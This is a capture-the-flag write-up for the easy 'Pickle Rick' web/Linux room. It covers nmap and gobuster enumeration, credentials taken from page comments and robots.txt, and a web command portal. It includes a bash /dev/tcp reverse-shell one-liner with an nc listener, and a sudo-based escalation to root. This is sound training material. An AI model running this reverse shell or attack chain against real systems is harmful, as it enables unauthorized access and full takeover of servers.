@@ -1,0 +1,194 @@
+---
+tags: [web, linux]
+---
+# Pickle Rick
+
+- **Description:** A Rick and Morty CTF. Help turn Rick back into a human!
+- **Difficulty:** Easy
+
+---
+
+## 🔎 Solution
+With the discovered IP address, I started scanning with Nmap and found that only two ports were open.
+```
+> nmap -p- -sV --min-rate 5000  10.64.184.238
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Accessing `http://<IP-address>:80/` revealed a simple webpage.
+<div style={{ width: '100%', margin: '0 auto' }}>
+  <img src={require("./dash.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+There were references to Burp in the content, so I inspected the traffic using Burp Suite. 
+In the HTTP response, a commented username was discovered: `R1ckRul3s`.
+<div style={{ width: '100%', margin: '0 auto' }}>
+  <img src={require("./username.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+Next, I used `gobuster` to enumerate directories.
+```
+> gobuster dir -u http://10.64.184.238/ -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.64.184.238/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/assets               (Status: 301) [Size: 315] [--> http://10.64.184.238/assets/]
+/index.html           (Status: 200) [Size: 1062]
+/robots.txt           (Status: 200) [Size: 17]
+/server-status        (Status: 403) [Size: 278]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+Checking `/robots.txt` revealed a string that looked like a password:
+```
+> curl http://10.64.184.238/robots.txt                                                                        
+Wubbalubbadubdub
+```
+
+Since this looked promising, I continued enumeration with `gobuster` using PHP extension scanning to locate a login page.
+```
+> gobuster dir -u http://10.64.184.238/ -w /usr/share/wordlists/dirb/common.txt -x php -t 50 -e 
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.64.184.238/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              php
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta.php.hta.php             (Status: 403) [Size: 278]
+/.htaccess.htaccess            (Status: 403) [Size: 278]
+/.htaccess.php.htaccess.php        (Status: 403) [Size: 278]
+/.htpasswd.htpasswd            (Status: 403) [Size: 278]
+/.hta.hta                 (Status: 403) [Size: 278]
+/.htpasswd.php.htpasswd.php        (Status: 403) [Size: 278]
+/assetsassets               (Status: 301) [Size: 315] [--> http://10.64.184.238/assets/]
+/denied.phpdenied.php           (Status: 302) [Size: 0] [--> /login.php]
+/index.htmlindex.html           (Status: 200) [Size: 1062]
+/login.phplogin.php            (Status: 200) [Size: 882]
+/portal.phpportal.php           (Status: 302) [Size: 0] [--> /login.php]
+/robots.txtrobots.txt           (Status: 200) [Size: 17]
+/server-statusserver-status        (Status: 403) [Size: 278]
+Progress: 9226 / 9226 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+Navigating to `/login.php`, I found a login form. 
+Using `R1ckRul3s:Wubbalubbadubdub`, I successfully authenticated and was redirected to a command execution page.
+<div style={{ width: '100%', margin: '0 auto' }}>
+  <img src={require("./portal.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+Running `ls` from the web shell returned:
+```
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+```
+
+However, the system blocked execution when trying to read files like:
+<div style={{ width: '100%', margin: '0 auto' }}>
+  <img src={require("./cat.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+Since direct file access wasn't possible, I attempted to spawn a reverse shell. 
+Using a payload from [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), I executed:
+```
+bash -c 'bash -i >& /dev/tcp/<IP-address>/1234 0>&1'
+```
+
+Listener setup:
+```
+nc -lvnp 1234
+```
+
+After sending the payload, I gained a shell:
+```
+> nc -lvnp 1234                              
+listening on [any] 1234 ...
+
+connect to [192.168.141.43] from (UNKNOWN) [10.64.184.238] 54444
+bash: cannot set terminal process group (1010): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ip-10-64-184-238:/var/www/html$ 
+www-data@ip-10-64-184-238:/var/www/html$ whoami
+whoami
+www-data
+```
+
+Now I could finally read the hidden file:
+```
+www-data@ip-10-64-184-238:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt
+cat Sup3rS3cretPickl3Ingred.txt
+mr. meeseek hair
+```
+
+Moving to Rick's home directory:
+```
+www-data@ip-10-64-184-238:/home/rick$ cat 'second ingredients'
+cat 'second ingredients'
+1 jerry tear
+```
+
+To escalate privileges, I checked `sudo` rights:
+```
+www-data@ip-10-64-184-238:/home/rick$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ip-10-64-184-238:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-64-184-238:
+    (ALL) NOPASSWD: ALL
+```
+
+So privilege escalation was trivial:
+```
+www-data@ip-10-64-184-238:/home/rick$ sudo bash
+sudo bash
+whoami
+root
+```
+
+Finally, the last ingredient:
+```
+cat /root/3rd.txt
+3rd ingredients: fleeb juice
+```
+
+Challenge complete.
